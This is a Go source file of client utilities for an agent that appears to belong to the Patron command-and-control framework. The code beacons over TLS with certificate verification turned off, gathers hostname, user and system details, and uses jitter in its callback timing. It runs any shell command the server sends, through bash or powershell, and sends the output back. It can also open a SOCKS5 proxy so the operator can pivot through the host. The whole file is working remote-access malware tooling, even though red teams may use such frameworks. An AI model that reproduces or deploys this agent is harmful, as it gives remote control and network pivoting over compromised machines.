package client_utils

// collection of utilities used by all agents

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"math/rand"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/armon/go-socks5"
	"github.com/google/uuid"

	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
	"github.com/PatronC2/Patron/client/client_utils/linux/linux_utils"
	"github.com/PatronC2/Patron/client/client_utils/windows/windows_utils"
	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/types"
)

type ProxyServer struct {
	server   *socks5.Server
	listener net.Listener
	cancel   context.CancelFunc
	wg       sync.WaitGroup
}

var activeProxy *ProxyServer

func Initialize(logging_enabled string) {
	set_logging, err := strconv.ParseBool(logging_enabled)
	if err != nil {
		fmt.Printf("Failed to parse LoggingEnabled: %v\n", err)
	}
	logger.EnableLogging(set_logging)
	if set_logging {
		if err := logger.SetLogFile("app.log"); err != nil {
			fmt.Printf("Error setting log file: %v\n", err)
		}
	}
}

func LoadCertificate(RootCert string) (*tls.Config, error) {
	publicKey, err := base64.StdEncoding.DecodeString(RootCert)
	if err != nil {
		return nil, err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(publicKey) {
		return nil, fmt.Errorf("failed to parse root certificate")
	}
	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
}

func GenerateAgentMetadata() (string, string, string) {
	agentID := uuid.New().String()
	var hostname string
	var username string

	if runtime.GOOS == "windows" {
		hostname = strings.TrimSpace(RunShellCommand("hostname"))
	} else {
		hostname = strings.TrimSpace(RunShellCommand("hostname -f"))
	}
	username = strings.TrimSpace(RunShellCommand("whoami"))

	if hostname == "" {
		hostname = "unknown-host"
	}
	if username == "" {
		username = "unknown-user"
	}

	return agentID, hostname, username
}

func RunShellCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-Command", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		logger.Logf(logger.Error, "Error running command: %v", command)
		return err.Error()
	}
	logger.Logf(logger.Done, "Ran command: %v", command)
	return string(output)
}

func EstablishConnection(config *tls.Config, ServerIP, ServerPort string) (*tls.Conn, error) {
	var address string
	if net.ParseIP(ServerIP).To4() == nil {
		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
	} else {
		address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
	}

	logger.Logf(logger.Info, "Dialing %v", address)

	beacon, err := tls.Dial("tcp", address, config)
	if err != nil {
		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
		return nil, err
	}
	return beacon, nil
}

func GetLocalIP(beacon *tls.Conn) string {
	return beacon.LocalAddr().(*net.TCPAddr).IP.String()
}

func SendRequest(encoder *gob.Encoder, reqType types.RequestType, payload interface{}) error {
	return encoder.Encode(types.Request{Type: reqType, Payload: payload})
}

func HandleError(beacon *tls.Conn, reqType string, err error) {
	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
	beacon.Close()
	time.Sleep(2 * time.Second)
}

func CalculateSleepInterval(CallbackFrequency string, CallbackJitter string) float64 {
	// DEPRECATED - USE CalculateNextCallbackTime
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	frequency, _ := strconv.Atoi(CallbackFrequency)
	jitter, _ := strconv.Atoi(CallbackJitter)
	jitterPercent := float64(jitter) * 0.01
	baseTime := float64(frequency)
	variance := baseTime * jitterPercent * r.Float64()
	return baseTime - (jitterPercent * baseTime) + 2*variance
}

func CalculateNextCallbackTime(callbackFrequency string, callbackJitter string) time.Time {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	frequency, _ := strconv.Atoi(callbackFrequency)
	jitter, _ := strconv.Atoi(callbackJitter)

	baseTime := float64(frequency)
	jitterPercent := float64(jitter) * 0.01
	variance := baseTime * jitterPercent * r.Float64()

	finalInterval := baseTime - (jitterPercent * baseTime) + 2*variance

	return time.Now().UTC().Add(time.Duration(finalInterval * float64(time.Second)))
}

func GetOSInfo() (string, string, string, string, string) {
	osType := runtime.GOOS
	osArch := runtime.GOARCH
	cpus := strconv.Itoa(runtime.NumCPU())

	var memory string
	if osType == "windows" {
		output := RunShellCommand("wmic os get TotalVisibleMemorySize /Value")
		memory = windows_utils.ParseWindowsMemory(output)
	} else {
		output := RunShellCommand("cat /proc/meminfo")
		memory = linux_utils.ParseLinuxMemory(output)
	}

	var osVersion string
	if osType == "windows" {
		output := RunShellCommand("systeminfo")
		osVersion = windows_utils.ParseWindowsSystemInfo(output)
	} else {
		output := RunShellCommand("uname -sr")
		osVersion = strings.TrimSpace(output)
	}

	return osType, osArch, osVersion, cpus, memory
}

func GetActiveProxy() *ProxyServer {
	return activeProxy
}

func ClearActiveProxy() {
	activeProxy = nil
}

func SetActiveProxy(proxy *ProxyServer) {
	activeProxy = proxy
}

func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
	if cmd.GetCommand() == "disable" {
		if GetActiveProxy() != nil {
			logger.Logf(logger.Info, "Disabling SOCKS5 proxy")
			GetActiveProxy().StopProxy()
			ClearActiveProxy()
			logger.Logf(logger.Done, "SOCKS5 proxy disabled")
		} else {
			logger.Logf(logger.Info, "No active SOCKS5 proxy to disable")
		}

		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    "Stopped SOCKS5 Proxy",
		}
		return common.WriteDelimited(conn, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	// Check if already running
	if GetActiveProxy() != nil {
		logger.Logf(logger.Warning, "A SOCKS5 proxy is already running. Cannot start a new one.")
		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    "A SOCKS5 proxy is already running. Stop it before starting a new one.",
		}
		return common.WriteDelimited(conn, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	portStr := cmd.GetCommand()
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		logger.Logf(logger.Error, "Invalid port number: %s", portStr)
		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    fmt.Sprintf("Invalid port number: %s. Port must be between 1 and 65535.", portStr),
		}
		return common.WriteDelimited(conn, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	logger.Logf(logger.Debug, "Starting SOCKS5 proxy on port %d", port)
	conf := &socks5.Config{}
	server, err := socks5.New(conf)
	if err != nil {
		logger.Logf(logger.Warning, "Failed to create SOCKS5 server: %v", err)
		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    fmt.Sprintf("Failed to create SOCKS5 proxy: %v", err),
		}
		return common.WriteDelimited(conn, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		logger.Logf(logger.Warning, "Failed to start listener on port %d: %v", port, err)
		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    fmt.Sprintf("Failed to start listener on port: %d: %v", port, err),
		}
		return common.WriteDelimited(conn, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	ctx, cancel := context.WithCancel(context.Background())
	proxy := &ProxyServer{
		server:   server,
		listener: listener,
		cancel:   cancel,
	}

	proxy.wg.Add(1)
	go func() {
		defer proxy.wg.Done()
		logger.Logf(logger.Info, "SOCKS5 proxy server started on port %d", port)
		if err := server.Serve(listener); err != nil && ctx.Err() == nil {
			logger.Logf(logger.Error, "Error while running SOCKS5 proxy server: %v", err)
		}
	}()

	SetActiveProxy(proxy)
	logger.Logf(logger.Done, "Started SOCKS5 proxy")

	status := &patronobuf.CommandStatusRequest{
		Uuid:      cmd.GetUuid(),
		Commandid: cmd.GetCommandid(),
		Result:    "1",
		Output:    "Started SOCKS5 Proxy",
	}
	return common.WriteDelimited(conn, &patronobuf.Request{
		Type: patronobuf.RequestType_COMMAND_STATUS,
		Payload: &patronobuf.Request_CommandStatus{
			CommandStatus: status,
		},
	})
}

func (p *ProxyServer) StopProxy() {
	logger.Logf(logger.Info, "Stopping SOCKS5 proxy server...")
	p.cancel()
	p.listener.Close()
	p.wg.Wait()
	logger.Logf(logger.Info, "SOCKS5 proxy server stopped.")
}

func HandleConfigurationRequest(beacon net.Conn, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, serverIP, serverPort, callbackFrequency, callbackJitter string, nextCallback time.Time) error {
	req := &patronobuf.Request{
		Type: patronobuf.RequestType_CONFIGURATION,
		Payload: &patronobuf.Request_Configuration{
			Configuration: &patronobuf.ConfigurationRequest{
				Uuid:              agentID,
				Username:          username,
				Hostname:          hostname,
				Ostype:            osType,
				Arch:              osArch,
				Osbuild:           osVersion,
				Cpus:              cpus,
				Memory:            memory,
				Agentip:           ip,
				Serverip:          serverIP,
				Serverport:        serverPort,
				Callbackfrequency: callbackFrequency,
				Callbackjitter:    callbackJitter,
				Masterkey:         "MASTERKEY",
				NextcallbackUnix:  nextCallback.Unix(),
			},
		},
	}

	if err := common.WriteDelimited(beacon, req); err != nil {
		return err
	}

	resp := &patronobuf.Response{}
	if err := common.ReadDelimited(beacon, resp); err != nil {
		return err
	}

	if resp.Type != patronobuf.ResponseType_CONFIGURATION_RESPONSE {
		return fmt.Errorf("unexpected response type: %v", resp.Type)
	}

	conf := resp.GetConfigurationResponse()
	if conf == nil {
		return fmt.Errorf("missing configuration response payload")
	}

	UpdateClientConfig(conf, serverIP, serverPort, callbackFrequency, callbackJitter)
	return nil
}

func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time) types.ConfigurationRequest {
	return types.ConfigurationRequest{
		AgentID:           agentID,
		Username:          username,
		Hostname:          hostname,
		OSType:            osType,
		OSArch:            osArch,
		OSBuild:           osVersion,
		CPUS:              cpus,
		MEMORY:            memory,
		AgentIP:           ip,
		ServerIP:          ServerIP,
		ServerPort:        ServerPort,
		CallbackFrequency: CallbackFrequency,
		CallbackJitter:    CallbackJitter,
		NextCallback:      nextCallback,
		MasterKey:         "MASTERKEY",
	}
}

func UpdateClientConfig(config *patronobuf.ConfigurationResponse, serverIP, serverPort, callbackFrequency, callbackJitter string) {
	UpdateConfigField(&serverIP, config.GetServerip(), "callback IP")
	UpdateConfigField(&serverPort, config.GetServerport(), "callback port")
	UpdateConfigField(&callbackFrequency, config.GetCallbackfrequency(), "callback frequency")
	UpdateConfigField(&callbackJitter, config.GetCallbackjitter(), "callback jitter")
}

func UpdateConfigField(current *string, new, fieldName string) {
	if *current != new {
		logger.Logf(logger.Info, "Updating %s", fieldName)
		*current = new
	}
}

func HandleCommandRequest(conn *tls.Conn, agentID string) error {
	logger.Logf(logger.Info, "Fetching commands to run")

	for {
		req := &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND,
			Payload: &patronobuf.Request_Command{
				Command: &patronobuf.CommandRequest{Uuid: agentID},
			},
		}

		if err := common.WriteDelimited(conn, req); err != nil {
			return fmt.Errorf("send command request: %w", err)
		}

		resp := &patronobuf.Response{}
		if err := common.ReadDelimited(conn, resp); err != nil {
			return fmt.Errorf("read command response: %w", err)
		}

		cmd := resp.GetCommandResponse()
		if cmd == nil {
			return fmt.Errorf("no command response")
		}

		logger.Logf(logger.Debug, "commandType: %v", cmd.Commandtype)

		if cmd.GetCommandtype() == "socks" {
			if err := HandleSocksCommand(conn, cmd); err != nil {
				return fmt.Errorf("handle SOCKS5 command: %w", err)
			}
			continue
		}

		status := executeCommandRequest(cmd)

		if status.GetResult() == "2" {
			logger.Logf(logger.Info, "No commands to execute. Exiting command loop.")
			return nil
		}

		statusReq := &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		}

		if err := common.WriteDelimited(conn, statusReq); err != nil {
			return fmt.Errorf("send command status: %w", err)
		}

		ack := &patronobuf.Response{}
		if err := common.ReadDelimited(conn, ack); err != nil {
			return fmt.Errorf("read command ack: %w", err)
		}

		logger.Logf(logger.Info, "Command status sent, ack received")
	}
}

func executeCommandRequest(cmd *patronobuf.CommandResponse) *patronobuf.CommandStatusRequest {
	if cmd.GetCommand() == "" && cmd.GetCommandtype() == "" {
		logger.Logf(logger.Info, "No command to execute.")
		return &patronobuf.CommandStatusRequest{Result: "2"}
	}

	var output, result string
	switch cmd.GetCommandtype() {
	case "shell":
		output = RunShellCommand(cmd.GetCommand())
		result = "1"
	case "kill":
		output = "~Killed~"
		result = "1"
	default:
		result = "2"
	}

	return &patronobuf.CommandStatusRequest{
		Uuid:      cmd.GetUuid(),
		Commandid: cmd.GetCommandid(),
		Result:    result,
		Output:    output,
	}
}
